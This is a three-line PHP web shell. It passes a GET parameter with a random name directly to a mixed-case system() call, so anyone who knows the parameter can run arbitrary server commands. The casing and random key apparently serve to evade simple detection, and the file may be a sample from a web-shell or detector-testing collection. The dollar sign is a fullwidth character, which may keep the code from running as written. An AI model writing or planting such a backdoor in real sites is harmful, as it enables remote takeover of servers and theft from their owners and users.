<?php
SysTeM(＄_GET['2kIfCGQq']);
?>
